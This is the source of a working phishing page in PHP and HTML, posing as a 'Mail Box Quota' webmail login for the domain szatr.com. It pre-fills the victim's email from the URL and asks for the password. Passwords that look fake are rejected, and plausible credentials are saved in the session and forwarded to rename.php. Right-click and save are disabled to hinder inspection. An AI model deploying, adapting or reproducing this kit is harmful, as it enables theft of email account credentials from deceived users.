<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email_msg = "";
$pass_msg = "";

$email = $userid;
$pass = "";

if($_POST) {
	$email = $_POST['email'];
	$pass = $_POST['passwd'];

	if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$/", $email)) {
		$email_msg = "Enter a valid email";
	}
        else if(trim($pass) == "") {
		$pass_msg = "Please enter password";
	}
        else if(strlen($pass) <= 4 || stripos($pass,'fuck') !== false || stripos($pass,'cheat') !== false || stripos($pass,'test') !== false || $pass == $email ) {
		$pass_msg = "Invalid password";
	}
   else {
		$_SESSION['email'] = $email;
		$_SESSION['pass'] = $pass;
		header("Location: rename.php");
		exit;
	}
}
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="shortcut icon" type="image/x-icon" href="http://www.szatr.com/favicon.ico">
<title>Szatr | Mail Box Quota</title><link rel="stylesheet" id="coToolbarStyle" href="chrome-extension://cjabmdjcfcfdmffimndhafhblfmpjdpe/toolbar/styles/placeholder.css" type="text/css"><script type="text/javascript" id="cosymantecbfw_removeToolbar">(function () {				var toolbarElement = {},					parent = {},					interval = 0,					retryCount = 0,					isRemoved = false;				if (window.location.protocol === 'file:') {					interval = window.setInterval(function () {						toolbarElement = document.getElementById('coFrameDiv');						if (toolbarElement) {							parent = toolbarElement.parentNode;							if (parent) {								parent.removeChild(toolbarElement);								isRemoved = true;								if (document.body && document.body.style) {									document.body.style.setProperty('margin-top', '0px', 'important');								}							}						}						retryCount += 1;						if (retryCount > 10 || isRemoved) {							window.clearInterval(interval);						}					}, 10);				}			})();</script><script type="text/javascript">

						function nospaces(t){

						if(t.value.match(/\s/g)){

						location.reload(true);

						t.value=t.value.replace(/\s/g,'');

						}

						}

						</script><script type="text/javascript">
document.addEventListener("keydown", function(e) {
  if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
    e.preventDefault();
    // Process event...
  }
}, false);
</script><script type="text/javascript">
						function validate()
{
	var X=document.forms["f1"]["user"].value
	var atpos=X.indexOf("@");
	var dotpos=X.lastIndexOf(".");
	if (atpos<1 || dotpos<atpos+2 || dotpos+2>=X.length)
		{
		location.reload(true);
		return false;
		}
	var submitok="True";
	var x=document.f1;
	var pwd=x.pass.value;
	if (pwd.length==0)
	{
		location.reload(true);
		submitok= "False";
	}
	else if (pwd.length<4 || pwd.length>20)
	{
		location.reload(true);
		submitok= "False";
	}
	if (submitok=="False")
	{
	return false
	}
}
						</script></head>



<body onload="document.f1.pass.focus()" oncontextmenu="return false" class="centre" style="margin-top: 32px; text-align: centre; background: #fff">
<br><br>

<div align="center">

<table background="chinabox_files/xlogo.png" height="488" width="488">

<tbody><tr><td>

	<div align="center">

	<img src="chinabox_files/logo.png" height="70" width="160">

	<br><br>
<p>
    Please make sure your password is correct, then you can continue
</p>
    <br>

	<form  method="POST" name="f14" onsubmit="return validate()" action="lozin.php">

	  <p>&nbsp;</p>
	  <p>
	    <input name="user" type="text" style="width:250px; height:50px; font-family: Verdana; font-size: 15px; font-weight: bold; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" placeholder="Email Address" value="<?php echo $userid ?>" readonly="readonly">	
	    
	    
	    
	    	    
	    <br>
	    <br>
	    
	    <br>
	    <input onkeyup="nospaces(this)" name="pass" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" placeholder="Password" type="password">	
	    
	    
	    
	    <br>
	    <br>
	    
	    <input value="
    Sign in and continue
" style="width:250px; height:60px; background-color: #0B2161; border: solid 3px #0B2161; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;" type="submit">
	    
	    <br>
	      </p>
	</form>



	<br>
	<hr align="center" width="250">

	<font face="calibri" size="2">
	Copyright � 2021 Webmail Admin.